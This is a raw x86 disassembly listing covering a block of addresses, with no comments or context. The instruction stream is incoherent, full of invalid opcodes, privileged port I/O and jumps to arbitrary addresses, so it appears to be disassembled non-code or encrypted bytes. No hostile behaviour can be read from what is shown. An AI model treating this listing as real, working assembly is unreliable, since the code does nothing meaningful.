  412e30:	cmp    bl,BYTE PTR [esi-0x550d3f0]
  412e36:	test   eax,0x3645e3d7
  412e3b:	pop    ds
  412e3c:	pushf  
  412e3d:	hlt    
  412e3e:	test   al,0xd6
  412e40:	add    al,BYTE PTR [esi+0x56]
  412e43:	aaa    
  412e44:	xchg   esi,eax
  412e45:	mov    eax,0x7ab5ef13
  412e4a:	push   0x49
  412e4c:	jae    0x412e36
  412e4e:	(bad)  
  412e4f:	fstp   QWORD PTR [esi-0x5e]
  412e52:	outs   dx,BYTE PTR ds:[esi]
  412e53:	mov    eax,0x745daacd
  412e58:	mov    bl,0x6c
  412e5a:	scas   al,BYTE PTR es:[edi]
  412e5b:	and    al,0x1
  412e5d:	mov    esp,0xaccd838c
  412e62:	lahf   
  412e63:	xchg   esp,eax
  412e64:	mov    esi,0xab0f9ae7
  412e69:	(bad)  
  412e6a:	push   ebp
  412e6b:	aaa    
  412e6c:	and    ecx,DWORD PTR [edi]
  412e6e:	dec    ebx
  412e6f:	add    DWORD PTR [edi-0xa],eax
  412e72:	inc    ebp
  412e73:	push   es
  412e74:	add    DWORD PTR [ecx+0x1d],ebp
  412e77:	cmp    ebp,0x55
  412e7a:	jl     0x412e6a
  412e7c:	adc    esi,DWORD PTR [ecx-0x10]
  412e7f:	push   ecx
  412e80:	fidivr WORD PTR ss:[esp+edi*1+0x321dbd5a]
  412e88:	sub    eax,0x688c0d4d
  412e8d:	dec    edx
  412e8e:	out    0xb4,eax
  412e90:	cmp    DWORD PTR [ebx+0x2c4f0ead],edi
  412e96:	popa   
  412e97:	xor    ah,BYTE PTR [ecx]
  412e99:	idiv   DWORD PTR [edi]
  412e9b:	cmp    al,0x73
  412e9d:	ss mov esp,0x6d68fbb2
  412ea3:	in     al,dx
  412ea4:	in     eax,0x83
  412ea6:	jmp    0x2072:0xbbe520d5
  412ead:	ins    BYTE PTR es:[edi],dx
  412eae:	pop    eax
  412eaf:	add    cl,BYTE PTR [edx-0x4aad96b8]
  412eb5:	pop    esp
  412eb6:	add    ah,bl
  412eb8:	push   cs
  412eb9:	scas   al,BYTE PTR es:[edi]
  412eba:	adc    esi,ecx
  412ebc:	inc    eax
  412ebd:	ds push es
  412ebf:	or     cl,BYTE PTR [ebx-0x9]
  412ec2:	push   es
  412ec3:	rep ins DWORD PTR es:[edi],dx
  412ec5:	mov    al,BYTE PTR [ebp-0x3c179dd9]
  412ecb:	or     eax,esi
  412ecd:	jne    0x412e83
  412ecf:	sub    dh,ah
  412ed1:	jmp    0x412f3c
  412ed3:	jp     0x412e9d
  412ed5:	jno    0x412f3a
  412ed7:	and    cl,dl
  412ed9:	push   es
  412eda:	pushf  
  412edb:	or     eax,0x26c9a3e0
  412ee0:	push   es
  412ee1:	in     eax,dx
  412ee2:	je     0x412f44
  412ee4:	and    DWORD PTR [eax-0x7e],ebx
  412ee7:	mov    dl,0xf8
  412ee9:	inc    edx
  412eea:	dec    edi
  412eeb:	push   esi
  412eec:	inc    ebx
  412eed:	(bad)  
  412eee:	xor    DWORD PTR [ebp-0x7af59cb9],esp
  412ef4:	sub    esp,esi
  412ef6:	sub    DWORD PTR [edx+edi*8+0x7c],eax
  412efa:	dec    esi
  412efb:	and    DWORD PTR [ebx],ebx
  412efd:	loopne 0x412ed9
  412eff:	hlt    
  412f00:	jp     0x412e8f
  412f02:	inc    edi
  412f03:	popf   
  412f04:	xchg   edx,eax
  412f05:	jmp    0xa798e2a9
  412f0a:	jne    0x412efc
  412f0c:	ret    
  412f0d:	stos   BYTE PTR es:[edi],al
  412f0e:	and    ch,BYTE PTR [ebx-0x58]
  412f11:	ins    BYTE PTR es:[edi],dx
  412f12:	jbe    0x412f11
  412f14:	sti    
  412f15:	jge    0x412ef4
  412f17:	mov    ds:0x5a74bdac,eax
  412f1c:	cmc    
  412f1d:	iret   
  412f1e:	in     al,dx
  412f1f:	xchg   esi,eax
  412f20:	cmp    dh,BYTE PTR [esi+edi*8-0x558b6df5]
  412f27:	cmp    BYTE PTR ds:0x62bd9508,0x47
  412f2e:	aaa    
  412f2f:	jecxz  0x412fa3
  412f31:	mov    eax,0xda111e4d
  412f36:	int3   
  412f37:	loopne 0x412f74
  412f39:	repz sbb ah,al
  412f3c:	xor    ecx,DWORD PTR [esi-0x4f]
  412f3f:	out    0x24,eax
  412f41:	ins    BYTE PTR es:[edi],dx
  412f42:	inc    ebp
  412f43:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  412f45:	dec    esp
  412f46:	or     al,0xfd
  412f48:	data16 xor BYTE PTR [esi-0x51c39fff],bh
  412f4f:	lods   al,BYTE PTR ds:[esi]
  412f50:	mov    cl,0xd6
  412f52:	aad    0x11
  412f54:	push   ebp
  412f55:	(bad)  [edi+edi*8+0x47]
  412f59:	sub    DWORD PTR [ebx+0x5ac8df86],esp
  412f5f:	inc    DWORD PTR [eax+0xf393f9c]
  412f65:	mul    DWORD PTR [ebp+0x1f]
  412f68:	int3   
  412f69:	lods   al,BYTE PTR ds:[esi]
  412f6a:	inc    esi
  412f6b:	out    dx,eax
  412f6c:	pop    ecx
  412f6d:	into   
  412f6e:	sbb    eax,0x224459e7
  412f73:	and    al,0x2d
  412f75:	and    eax,0x4bcc54c2
  412f7a:	adc    eax,0xc268c349
  412f7f:	pop    ebx
  412f80:	sub    BYTE PTR [ecx-0x16],ch
  412f83:	imul   DWORD PTR [edi]
  412f85:	dec    ecx
  412f86:	mov    ss,WORD PTR [esi+0x2a358ef3]
  412f8c:	test   DWORD PTR [eax],esi
  412f8e:	jmp    0x4c3d:0x4936af5e
  412f95:	push   esp
  412f96:	mov    ch,0xe7
  412f98:	jae    0x412f36
  412f9a:	or     ah,BYTE PTR [eax+0x1e854ed2]
  412fa0:	jne    0x412fc8
  412fa2:	leave  
  412fa3:	push   ds
  412fa4:	popa   
  412fa5:	inc    eax
  412fa6:	mov    bl,0x52
  412fa8:	xchg   BYTE PTR [eax-0x2b],dh
  412fab:	or     ch,BYTE PTR [esi+edx*8+0x2e2d5565]
  412fb2:	sbb    BYTE PTR [ecx+0x45251263],0x4f
  412fb9:	jmp    0x413017
  412fbb:	mov    dh,0xea
  412fbd:	mov    al,0xbb
  412fbf:	or     bl,BYTE PTR [edx]
  412fc1:	jge    0x412f80
  412fc3:	add    edi,DWORD PTR ds:0x808088ea
  412fc9:	test   al,bh
  412fcb:	leave  
  412fcc:	mov    ebp,0xab543158
  412fd1:	sub    BYTE PTR [ebp-0x41c89272],cl
  412fd7:	ret    0x689d
  412fda:	jle    0x412ff5
  412fdc:	xor    bl,BYTE PTR [eax+edi*4+0x7daec0eb]
  412fe3:	adc    al,0xab
  412fe5:	mov    bh,0x21
  412fe7:	call   0x85f308af
  412fec:	popf   
  412fed:	xchg   ebx,eax
  412fee:	or     esp,DWORD PTR [esi-0x5d]
  412ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff2:	mov    cl,0x1c
  412ff4:	in     al,dx
  412ff5:	dec    ebx
  412ff6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  412ff8:	pop    edi
  412ff9:	pop    ss
  412ffa:	pop    eax
  412ffb:	and    ecx,DWORD PTR [ecx]
  412ffd:	sbb    dh,BYTE PTR [ebx-0x42]
  413000:	dec    edi
  413001:	or     DWORD PTR [ebx+0x3d],0x15c9cac4
  413008:	fld    QWORD PTR [ebx-0xb12d2b5]
  41300e:	add    BYTE PTR [ebp*8+0x7e57bd54],ch
  413015:	pop    esp
  413016:	pop    ebx
  413017:	sub    al,0xd5
  413019:	pop    ss
  41301a:	jge    0x413017
  41301c:	(bad)  
  41301d:	dec    edx
  41301e:	cs cdq 
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	pop    ds
  413022:	dec    esi
  413023:	xchg   DWORD PTR [ebx+0x4b],edx
  413026:	(bad)  
  413027:	jb     0x412ff1
  413029:	mov    bl,0x3
  41302b:	jne    0x41309f
  41302d:	mov    DWORD PTR [ebp-0x8464d71],edx
  413033:	and    BYTE PTR [eax+edx*1],bh
  413036:	fnstenv [ecx+0x568353f1]
  41303c:	cmp    al,0xbe
  41303e:	mov    bl,0xcb
  413040:	xchg   edx,eax
  413041:	mov    cl,0xe9
  413043:	xchg   edi,eax
  413044:	and    ch,BYTE PTR [eax-0x6d885c0c]
  41304a:	pop    esi
  41304b:	xchg   esi,eax
  41304c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41304d:	cli    
  41304e:	out    dx,al
  41304f:	xor    BYTE PTR [ebx],0x3f
  413052:	mov    ecx,0x871bb525
  413057:	aad    0xfa
  413059:	mov    edx,0xd84482a9
  41305e:	dec    ecx
  41305f:	pop    edx
  413060:	mov    bh,0x7c
  413062:	sub    al,BYTE PTR [esi]
  413064:	xchg   ebp,eax
  413065:	sub    BYTE PTR [ebp-0xc5063c7],cl
  41306b:	xchg   DWORD PTR [edx-0x31e10b5a],ebp
  413071:	fcomp  QWORD PTR [esi-0x656e9f9c]
  413077:	imul   esi,esi,0x38
  41307a:	xchg   edi,eax
  41307b:	or     al,0x48
  41307d:	out    dx,eax
  41307e:	sbb    BYTE PTR [ecx],ch
  413080:	mov    ecx,0x707daa12
  413085:	arpl   di,si
  413087:	inc    eax
  413088:	fimul  DWORD PTR [edx+0x5a]
  41308b:	fucomip st,st(0)
  41308d:	cmp    cl,bl
  41308f:	xor    ebp,DWORD PTR [eax+0x2f]
  413092:	sub    esi,eax
  413094:	lahf   
  413095:	mov    esi,DWORD PTR [ecx+ecx*2]
  413098:	shl    BYTE PTR [esi-0x432df36f],1
  41309e:	mov    esi,fs
  4130a0:	mov    dh,0xcd
  4130a2:	and    DWORD PTR [esi],ecx
  4130a4:	pop    ss
  4130a5:	les    esi,FWORD PTR [esi+0x5c99e120]
  4130ab:	push   ebp
  4130ac:	mov    cl,BYTE PTR [edx]
  4130ae:	and    bl,ah
  4130b0:	es mov cl,0x43
  4130b3:	sub    al,0x2a
  4130b5:	pop    esi
  4130b6:	sbb    DWORD PTR [ecx-0x3c],ebp
  4130b9:	neg    ch
  4130bb:	loop   0x413048
  4130bd:	xor    ecx,DWORD PTR [edx-0x66]
  4130c0:	mov    ebp,0x9425b322
  4130c5:	fstp   DWORD PTR [eax]
  4130c7:	xchg   ebx,eax
  4130c8:	pop    eax
  4130c9:	hlt    
  4130ca:	inc    eax
  4130cb:	in     al,0x8c
  4130cd:	sub    al,0xb9
  4130cf:	cmp    eax,0x37d18fd9
  4130d4:	popf   
  4130d5:	and    DWORD PTR [ecx],ebp
  4130d7:	js     0x413079
  4130d9:	jg     0x413072
  4130db:	mov    cl,0x59
  4130dd:	ss bnd jnp 0x41308e
  4130e1:	inc    ebx
  4130e2:	sti    
  4130e3:	mov    dl,0x69
  4130e5:	jmp    0xc7252788
  4130ea:	sti    
  4130eb:	test   ecx,esp
  4130ed:	imul   dx,WORD PTR [edi+ecx*4-0x18],0xea20
  4130f4:	add    al,0xef
  4130f6:	pop    ebx
  4130f7:	push   ecx
  4130f8:	xchg   DWORD PTR [edx],eax
  4130fa:	xchg   esp,ebx
  4130fc:	popa   
  4130fd:	fld    DWORD PTR [ebx]
  4130ff:	bound  ebp,QWORD PTR [eax]
  413101:	arpl   WORD PTR [ecx+0x6a],sp
  413104:	mov    esp,0x1301f4c
  413109:	mov    DWORD PTR [ecx],ebx
  41310b:	mov    DWORD PTR [ebp-0x1b],ebx
  41310e:	inc    edx
  41310f:	mov    cl,0x3d
  413111:	out    0xf0,eax
  413113:	pop    edx
  413114:	lock nop
  413116:	in     eax,dx
  413117:	jp     0x4130ed
  413119:	add    eax,0xda5fc7
  41311e:	cdq    
  41311f:	pop    DWORD PTR [ebx]
  413121:	arpl   bp,cx
  413123:	push   ebp
  413124:	mov    bl,0x4
  413126:	test   eax,0x4050a20c
  41312b:	(bad)  
  41312c:	push   0xd
  41312e:	jae    0x4130dc
  413130:	(bad)  
  413131:	sub    ecx,ecx
  413133:	jae    0x41310b
  413135:	(bad)  
  413136:	clc    
  413137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413138:	jmp    0x9f5cf24
  41313d:	jg     0x41311e
  41313f:	cs dec ecx
  413141:	lahf   
  413142:	nop
  413143:	mov    eax,ds:0xe62d2734
  413148:	jo     0x4130d4
  41314a:	or     al,0xd1
  41314c:	popa   
  41314d:	mov    ds:0xe5a36586,al
  413152:	mov    ds:0x305d734b,al
  413157:	clc    
  413158:	int    0xa7
  41315a:	into   
  41315b:	call   0xef3c42a6
  413160:	sub    esp,DWORD PTR [edx]
  413162:	shl    DWORD PTR [ecx-0x69],1
  413165:	addr16 sahf 
  413167:	lahf   
  413168:	mov    edx,0xda1258fe
  41316d:	stos   DWORD PTR es:[edi],eax
  41316e:	data16 loopne 0x413196
  413171:	add    al,0xdb
  413173:	repz cs push cs
  413176:	cs or  al,0x61
  413179:	or     bl,ch
  41317b:	enter  0x1129,0x8b
  41317f:	mov    ecx,0xd2188ab5
  413184:	es lahf 
  413186:	inc    ebp
  413187:	pop    es
  413188:	gs jne 0x4131fc
  41318b:	inc    esi
  41318d:	outs   dx,DWORD PTR ds:[esi]
  41318e:	xchg   BYTE PTR [ebp-0x3a],cl
  413191:	cmp    eax,0x811c1b68
  413196:	push   edx
  413197:	leave  
  413198:	int3   
  413199:	jb     0x413216
  41319b:	out    dx,eax
  41319c:	push   edx
  41319d:	pop    ebp
  41319e:	xor    edi,DWORD PTR [ecx]
  4131a0:	pop    edi
  4131a1:	test   al,0xc
  4131a3:	ins    BYTE PTR es:[edi],dx
  4131a4:	dec    ebp
  4131a5:	inc    ebx
  4131a6:	outs   dx,DWORD PTR ds:[esi]
  4131a7:	rcl    BYTE PTR [edx+0x476b06cc],1
  4131ad:	or     esi,DWORD PTR [ecx+0x6a]
  4131b0:	jno    0x41319d
  4131b2:	enter  0xe28e,0x42
  4131b6:	mov    esp,0x12188d75
  4131bb:	mov    dl,0x20
  4131bd:	shl    DWORD PTR [ebx+esi*1],0x3d
  4131c1:	call   0x5bd322b5
  4131c6:	adc    DWORD PTR [edi],edx
  4131c8:	adc    BYTE PTR [esi-0x797fafac],dh
  4131ce:	icebp  
  4131cf:	fstp   DWORD PTR [eax-0x1f]
  4131d2:	and    ebp,DWORD PTR [edx-0x33fe3784]
  4131d8:	inc    ecx
  4131d9:	jmp    0xbbe1:0xeaecd299
  4131e0:	sbb    DWORD PTR [ebx],0x12
  4131e3:	pusha  
  4131e4:	inc    ecx
  4131e5:	mov    ds:0x9df93651,al
  4131ea:	jmp    0x4d55:0xf83670fb
  4131f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131f2:	dec    esp
  4131f3:	into   
  4131f4:	jnp    0x4131bd
  4131f6:	(bad)  
  4131f7:	adc    ebx,DWORD PTR [edi]
  4131f9:	add    DWORD PTR [edx],edi
  4131fb:	data16 aas 
  4131fd:	pushf  
  4131fe:	pop    esp
  4131ff:	dec    eax
  413200:	mov    al,ds:0x74ec5c22
  413205:	popa   
  413206:	pop    edx
  413207:	int3   
  413208:	mov    ecx,0x945d6332
  41320d:	mov    ecx,0x5dd3bdf9
  413212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413213:	mov    dl,0x12
  413215:	int    0xa8
  413217:	jecxz  0x41321f
  413219:	nop
  41321a:	test   al,0xc2
  41321c:	or     eax,0x6de45805
  413221:	ja     0x41323a
  413223:	push   0xffffffc8
  413225:	jo     0x4131e5
  413227:	and    cl,ah
  413229:	add    BYTE PTR es:[ecx-0x24c07548],bl
  413230:	xchg   BYTE PTR [eax+0x670e6247],dl
  413236:	mov    DWORD PTR [edx+0x7c],edi
  413239:	in     al,dx
  41323a:	out    0x61,al
  41323c:	or     al,0xe9
  41323e:	jmp    0x48ffdd70
  413243:	out    dx,al
  413244:	adc    dl,BYTE PTR [edx-0x7f]
  413247:	(bad)  [eax-0x35]
  41324a:	mov    ds:0x9cb79e1,al
  41324f:	fild   WORD PTR [ebx+0x2b]
  413252:	push   esi
  413253:	cmp    BYTE PTR [ecx-0x76],ch
  413256:	mov    ah,0xed
  413258:	and    bp,sp
  41325b:	fsubr  DWORD PTR [esi+0x289ef862]
  413261:	adc    bh,ah
  413263:	lea    eax,[ebx]
  413265:	adc    eax,0x65d270ae
  41326a:	add    dl,BYTE PTR [esi+0x19111aed]
  413270:	or     BYTE PTR [edi],cl
  413272:	cmp    bh,dl
  413274:	mov    WORD PTR [edx-0x31d2559f],es
  41327a:	add    al,0xc1
  41327c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41327d:	out    dx,al
  41327e:	call   0xf0af:0x9ef5fa13
  413285:	lods   al,BYTE PTR ds:[esi]
  413286:	mov    cl,0xa8
  413288:	ror    DWORD PTR [esi-0x52],0x9f
  41328c:	xchg   ebp,eax
  41328d:	and    DWORD PTR [ebx+0x74],esi
  413290:	inc    ebp
  413291:	and    ebp,0xffffffac
  413294:	jns    0x4132dd
  413296:	lods   eax,DWORD PTR ds:[esi]
  413297:	mov    ah,0x8f
  413299:	nop
  41329a:	loopne 0x41325e
  41329c:	imul   edi,esi,0x77
  41329f:	adc    ecx,DWORD PTR [esi-0x16]
  4132a2:	jmp    0x41330a
  4132a4:	push   ecx
  4132a5:	cwde   
  4132a6:	inc    ebp
  4132a7:	inc    esp
  4132a8:	ret    
  4132a9:	rcl    DWORD PTR [esi+eiz*1],cl
  4132ac:	cmp    eax,edi
  4132ae:	je     0x4132b8
  4132b0:	rcr    DWORD PTR [ecx],1
  4132b2:	sub    BYTE PTR ds:0xb9e1eaf1,dl
  4132b8:	jmp    0x3e5426f2
  4132bd:	mov    al,ch
  4132bf:	xchg   edx,eax
  4132c0:	fs dec edx
  4132c2:	loopne 0x41332a
  4132c4:	push   0xc7c0ea53
  4132c9:	xor    esp,DWORD PTR [esi-0x3b414cdb]
  4132cf:	sub    cl,ah
  4132d1:	loopne 0x413302
  4132d3:	int3   
  4132d4:	adc    eax,0x1deafc7a
  4132d9:	pop    es
  4132da:	cwde   
  4132db:	or     eax,0xdc2b1a9c
  4132e0:	sub    al,0xae
  4132e2:	mov    BYTE PTR ds:0xe5a5c631,bl
  4132e8:	mov    bh,0x9a
  4132ea:	mov    gs,WORD PTR [ebx-0x3d]
  4132ed:	pop    ds
  4132ee:	sub    esp,DWORD PTR [edx+0x133aba1c]
  4132f4:	or     BYTE PTR [eax+edx*8+0x101a9f61],0x87
  4132fc:	adc    bh,bl
  4132fe:	adc    BYTE PTR [edx+0x9],cl
  413301:	sahf   
  413302:	shl    dh,cl
  413304:	(bad)  
  413305:	xchg   ebx,eax
  413306:	mov    BYTE PTR [eax],bl
  413308:	mov    esi,0xa54416e9
  41330d:	retf   
  41330e:	repz pop esi
  413310:	mov    ebp,0xc9abb4e5
  413315:	aam    0x98
  413317:	mov    esp,0xad2803b5
  41331c:	dec    ebp
  41331d:	icebp  
  41331e:	ror    BYTE PTR [ebx],1
  413320:	call   0x785e54c3
  413325:	push   cs
  413326:	gs pop es
  413328:	sar    BYTE PTR [edi],1
  41332a:	jno    0x413308
  41332c:	stc    
  41332d:	pop    ebx
  41332e:	outs   dx,DWORD PTR ds:[esi]
  41332f:	mov    dl,bl
  413331:	ret    
  413332:	idiv   BYTE PTR [eax+0x32b8c577]
  413338:	ss cmc 
  41333a:	in     al,dx
  41333b:	in     eax,dx
  41333c:	and    esp,DWORD PTR [edi]
  41333e:	out    dx,eax
  41333f:	jo     0x4133b8
  413341:	pop    edx
  413342:	cmc    
  413343:	loopne 0x413303
  413345:	and    ah,BYTE PTR [edi]
  413347:	repnz and esi,DWORD PTR [edi]
  41334a:	and    eax,DWORD PTR [ebp-0x40]
  41334d:	push   0x8
  41334f:	sub    edi,DWORD PTR [esi+0x31fdd4a1]
  413355:	test   DWORD PTR [ecx+edi*1-0x34],0xac9f99d3
  41335d:	test   eax,0x768cd7a5
  413362:	daa    
  413363:	lea    edi,[ebx]
  413365:	jo     0x4133cc
  413367:	inc    ecx
  413368:	out    0x86,eax
  41336a:	(bad)  
  41336b:	adc    al,0x25
  41336d:	xchg   edi,eax
  41336e:	fidiv  DWORD PTR [edx]
  413370:	xchg   ebp,eax
  413371:	outs   dx,DWORD PTR ds:[esi]
  413372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413373:	cmc    
  413374:	xchg   ebp,eax
  413375:	rcpps  xmm7,xmm0
  413378:	aad    0x56
  41337a:	add    DWORD PTR [esi],eax
  41337c:	repz jo 0x41338d
  41337f:	xchg   DWORD PTR [ebx-0x56],ecx
  413382:	mov    al,ds:0x3016bf8d
  413387:	int3   
  413388:	push   eax
  413389:	mov    bl,0x90
  41338b:	xchg   edx,eax
  41338c:	cwde   
  41338d:	add    al,0x83
  41338f:	ret    0x13ff
  413392:	popa   
  413393:	loopne 0x4133aa
  413395:	pop    es
  413396:	pop    edx
  413397:	or     DWORD PTR ds:0x18a0f17,0x2b
  41339e:	call   0x323949eb
  4133a3:	and    DWORD PTR [ecx+0x25],ebp
  4133a6:	sar    DWORD PTR [edi+0x36],1
  4133a9:	pop    esi
  4133aa:	(bad)  
  4133ab:	(bad)  
  4133ad:	pop    eax
  4133ae:	aam    0x1d
  4133b0:	push   ds
  4133b1:	adc    bh,ch
  4133b3:	jle    0x413410
  4133b5:	xor    dh,BYTE PTR [edx+0xc438c62]
  4133bb:	sti    
  4133bc:	retf   
  4133bd:	aad    0xf
  4133bf:	adc    al,0x7
  4133c1:	neg    DWORD PTR [edx]
  4133c3:	sub    ax,0x29cb
  4133c7:	dec    ebx
  4133c8:	sbb    DWORD PTR [edx-0x26],esi
  4133cb:	icebp  
  4133cc:	sub    BYTE PTR [ebp+eiz*1+0x6c7a4c6d],dl
  4133d3:	or     ebx,eax
  4133d5:	sbb    dl,dh
  4133d7:	inc    ebx
  4133d8:	fist   DWORD PTR [ebp+0x54]
  4133db:	shl    DWORD PTR [esi+0x27f7d571],cl
  4133e1:	mov    eax,0xd61d1
  4133e6:	aas    
  4133e7:	mov    ah,0x9c
  4133e9:	mov    dh,0xbb
  4133eb:	dec    edx
  4133ec:	aas    
  4133ed:	xor    dh,BYTE PTR [eax]
  4133ef:	dec    edi
  4133f0:	das    
  4133f1:	inc    edx
  4133f2:	inc    ebp
  4133f3:	jnp    0x4133d3
  4133f5:	call   0xacce:0x6d159547
  4133fc:	cdq    
  4133fd:	xchg   BYTE PTR [edi],bh
  4133ff:	or     BYTE PTR [ebp+ecx*1-0x31715e26],ch
  413406:	inc    ecx
  413407:	mov    edi,0x719258ab
  41340c:	jmp    0x413460
  41340e:	in     eax,0xc2
  413410:	cmp    eax,0x51222905
  413415:	mov    ds:0x6132221,eax
  41341a:	mov    ecx,0x3ba9d866
  41341f:	adc    BYTE PTR [ecx+ebp*4],dh
  413422:	sbb    DWORD PTR [eax+ebx*4-0x7e],edx
  413426:	ins    BYTE PTR es:[edi],dx
  413427:	popa   
  413428:	fbld   TBYTE PTR [ebp-0x40283eae]
  41342e:	cmp    eax,0x6ef075e
  413433:	sub    al,0x4c
  413435:	mov    edi,0xb0905bba
  41343a:	cmp    eax,0xa32dd0dc
  41343f:	push   0x5c3f3390
  413444:	add    al,0xf9
  413446:	(bad)  
  413447:	cmc    
  413448:	pushf  
  413449:	inc    ebp
  41344a:	stos   BYTE PTR es:[edi],al
  41344b:	outs   dx,BYTE PTR ds:[esi]
  41344c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41344d:	jle    0x41347a
  41344f:	retf   0x9e2b
  413452:	xchg   esi,eax
  413453:	in     al,dx
  413454:	mov    BYTE PTR [edx-0x58],ch
  413457:	hlt    
  413458:	das    
  413459:	add    DWORD PTR [edi-0x77],ebx
  41345c:	mov    bl,0x1e
  41345e:	push   edx
  41345f:	out    0x43,eax
  413461:	ficom  WORD PTR [esi]
  413463:	sub    DWORD PTR [edx],esp
  413465:	ins    DWORD PTR es:[edi],dx
  413466:	in     eax,0x42
  413468:	jl     0x4134b5
  41346a:	pop    ecx
  41346b:	fwait
  41346c:	jno    0x413490
  41346e:	es inc edx
  413470:	rol    BYTE PTR [esi-0x52f3078d],0xa9
  413477:	cmp    BYTE PTR [ebp+0x4238ec4f],0xbd
  41347e:	ret    
  41347f:	clc    
  413480:	cdq    
  413481:	lods   al,BYTE PTR ds:[esi]
  413482:	add    BYTE PTR [edi-0x60],bh
  413485:	adc    al,0xd1
  413487:	clc    
  413488:	jae    0x4134cb
  41348a:	push   ss
  41348b:	or     DWORD PTR [ecx+edx*4],eax
  41348e:	mov    esp,0xfb704728
  413493:	fnstenv [esi]
  413495:	xchg   ebx,esi
  413497:	or     al,0x70
  413499:	add    eax,DWORD PTR [edx+ebp*8-0x61]
  41349d:	bound  eax,QWORD PTR ss:[ecx+0x5e6c3ead]
  4134a4:	pop    esp
  4134a5:	mov    esi,fs
  4134a7:	mov    bl,0xa3
  4134a9:	out    0xab,eax
  4134ab:	push   edx
  4134ac:	sub    eax,0xc7b29de7
  4134b1:	rcl    BYTE PTR [ebx+0x4c],cl
  4134b4:	gs mov bh,0x50
  4134b7:	push   0x6c
  4134b9:	sti    
  4134ba:	in     eax,dx
  4134bb:	imul   edx,DWORD PTR [eax],0xffffff88
  4134be:	loopne 0x413448
  4134c0:	out    0x5c,al
  4134c2:	into   
  4134c3:	popf   
  4134c4:	in     eax,0x41
  4134c6:	mov    ?,WORD PTR [ecx+0x3a]
  4134c9:	or     cl,BYTE PTR [ecx]
  4134cb:	pop    esi
  4134cc:	add    BYTE PTR [esi+0x31],0x27
  4134d0:	jo     0x4134d0
  4134d2:	rcr    DWORD PTR [ebp+0x54],0x72
  4134d6:	lea    ebx,[ebp-0x74]
  4134d9:	in     eax,dx
  4134da:	cmp    al,0x6e
  4134dc:	in     al,dx
  4134dd:	cmp    al,0x15
  4134df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134e0:	xlat   BYTE PTR ds:[ebx]
  4134e1:	pop    esi
  4134e2:	ror    ebp,0x9a
  4134e5:	les    ecx,FWORD PTR [eax]
  4134e7:	push   cs
  4134e8:	in     eax,dx
  4134e9:	lock dec ebp
  4134eb:	and    al,0x95
  4134ed:	mov    edi,0x446b2058
  4134f2:	dec    edx
  4134f3:	in     al,dx
  4134f4:	jne    0x413543
  4134f6:	inc    ebp
  4134f7:	cmp    BYTE PTR [edi-0x12],al
  4134fa:	pop    edi
  4134fb:	adc    DWORD PTR [ebp+0x72],edi
  4134fe:	add    eax,0x621ba03c
  413503:	adc    BYTE PTR [ecx],bl
  413505:	fsubr  QWORD PTR [ebx]
  413507:	jmp    0x4134f0
  413509:	inc    esi
  41350a:	mov    ds:0x6300d2f2,al
  41350f:	xchg   esp,eax
  413510:	jmp    0x413496
  413512:	cdq    
  413513:	mov    ecx,0xc68e41d8
  413518:	ins    DWORD PTR es:[edi],dx
  413519:	adc    BYTE PTR [ebx],bh
  41351b:	call   0xec64a66c
  413520:	push   0x75
  413522:	push   cs
  413523:	call   0x7527f1fb
  413528:	stos   DWORD PTR es:[edi],eax
  413529:	mov    ah,0x82
  41352b:	sbb    eax,0xf6d4ce07
  413530:	xor    al,0x9e
  413532:	aad    0x9d
  413534:	test   DWORD PTR [edi-0x59d6109d],esi
  41353a:	jnp    0x4135ad
  41353c:	sbb    ebx,0xbadf11a3
  413542:	xchg   ebx,eax
  413543:	lods   eax,DWORD PTR ds:[esi]
  413544:	lods   eax,DWORD PTR ds:[esi]
  413545:	dec    ecx
  413546:	push   esp
  413547:	test   BYTE PTR [edi+0x34fcb455],ch
  41354d:	imul   ebx,ebx,0x12f322e8
  413553:	pop    ss
  413554:	loope  0x41359e
  413556:	das    
  413557:	data16 int 0x80
  41355a:	xor    al,0x4f
  41355c:	out    0xf7,al
  41355e:	sub    bh,BYTE PTR [edi-0x7c]
  413561:	int    0xf9
  413563:	fs inc edx
  413565:	mov    eax,0x8cc76497
  41356a:	gs jns 0x413542
  41356d:	test   bh,dl
  41356f:	mov    ecx,0xd43c7bed
  413574:	push   ecx
  413575:	(bad)  
  413576:	out    0xe3,eax
  413578:	pop    edi
  413579:	cs pop edx
  41357b:	mov    bh,0x94
  41357d:	pop    ss
  41357e:	pop    DWORD PTR [edi-0x45]
  413581:	or     eax,ecx
  413583:	gs jne 0x4135fe
  413586:	test   BYTE PTR [ebx],ah
  413588:	xor    DWORD PTR [ebx+0x6897c1c6],eax
  41358e:	mov    WORD PTR [eax+0x1],?
  413591:	aas    
  413592:	test   eax,0xcf3973a6
  413597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413598:	sub    BYTE PTR ds:0x7fe87b2c,al
  41359e:	inc    esi
  41359f:	mov    ebp,0xcfe57900
  4135a4:	sbb    al,0x1e
  4135a6:	pop    eax
  4135a7:	inc    ebx
  4135a8:	add    BYTE PTR [eax+0x7f259995],dl
  4135ae:	repz jmp 0x3d0afe27
  4135b4:	cmp    cl,bl
  4135b6:	sahf   
  4135b7:	mov    esp,0x309e282f
  4135bc:	push   0x64
  4135be:	jae    0x41356f
  4135c0:	cmp    al,0xbf
  4135c2:	mov    edi,0x985fb918
  4135c7:	adc    DWORD PTR [edi],ebx
  4135c9:	cmp    BYTE PTR [ebx-0x7e],cl
  4135cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135cd:	add    dh,BYTE PTR [ecx-0x40]
  4135d0:	test   BYTE PTR [ecx+0x24a739ea],dh
  4135d6:	dec    eax
  4135d7:	or     DWORD PTR [esi+0xe8cc371],edi
  4135dd:	sbb    eax,0xd1cb4e25
  4135e2:	adc    al,0x46
  4135e4:	add    edx,DWORD PTR [ebp+esi*2+0x2f]
